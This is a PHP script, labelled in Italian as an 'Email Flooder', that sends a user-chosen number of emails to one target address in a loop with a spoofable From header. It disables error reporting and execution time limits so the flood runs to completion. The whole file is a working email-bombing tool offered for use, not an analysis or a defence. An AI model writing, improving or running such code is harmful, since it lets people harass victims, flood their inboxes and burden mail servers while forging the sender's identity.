<? 
/*
###########################################################
#                                                         #
#   php Email Flooder creato da greco395.com              #
#                                                         #
#   Syle bootstrap ( https://github.com/twbs/bootstrap )  #
#                                                         #
###########################################################
*/
error_reporting (0); 
if(!set_time_limit(0)){
    $limit = false; 
}else{
    set_time_limit(0);
    ignore_user_abort(1);
    $limit = true; 
}

ini_set('max_execution_time', '0');
?>

<?php
$_POST['email-destinatario'] = stripslashes($_POST['email-destinatario']);
$_POST['messaggio'] = stripslashes($_POST['messaggio']);
$_POST['email-mittente'] = stripslashes($_POST['email-mittente']);
$_POST['oggetto'] = stripslashes($_POST['oggetto']);

$tipo_msg = "html";
// $tipo_msg = "plain";

if($_POST['email-destinatario'] && $_POST['messaggio'] && $_POST['email-mittente']) {
    
$headers = "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/".$tipo_msg."; charset=windows-1251\r\n";
$headers .= "From: ".$_POST['email-mittente']."\n"; 


if(preg_match('/[0-9]+/',$_POST['num_mail'])){ 
    for($i=0;$i<$_POST['num_mail'];$i++){
        mail($_POST['email-destinatario'], $_POST['oggetto'], $_POST['messaggio'], $headers) or die('Cannot send the message'); 
        sleep(1);
    } 
}else{
    echo ('Incorrect (or not entered) number of messages'); 
}  
   
// messaggio avvenuto invio
echo ('EMAIL INVIATE CON SUCCESSO ;)'); 
}
?>
